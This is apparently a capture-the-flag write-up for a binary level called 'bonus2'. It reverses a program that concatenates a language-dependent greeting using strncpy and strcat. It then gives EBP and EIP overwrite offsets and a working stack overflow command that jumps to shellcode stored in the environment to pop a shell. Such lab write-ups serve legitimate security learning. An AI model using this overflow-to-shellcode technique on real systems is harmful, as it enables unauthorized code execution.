needs two arguments

copies the first 40 char of av[1] in a variable (let's call it myargs)

copies 32 characters of av[2] to myargs + 40

getenv("LANG") in a var

checks if it exists

compares lang_var to fi and then to nl
sets language int accordingly

concatenates a greeting based on language value with myargs

calls are
strncpy, memcmp and strcat
we should be able to overflow


after changing the LANG var to "fi" to have a longer greeting 
with len(av[1]) >= 40, we can overflow with the second arg in the ebp and the eip
ebp offset = 14
eip offset = 18

we can do the same exploit as bonus0 (SHELLCODE in env)

export LANG="fi"
./bonus2 `python -c 'print("a" * 40)'` `python -c 'print("a" * 18 + "\x1d\xf8\xff\xbf")'`

// replace env address if needed

we are inside a shell
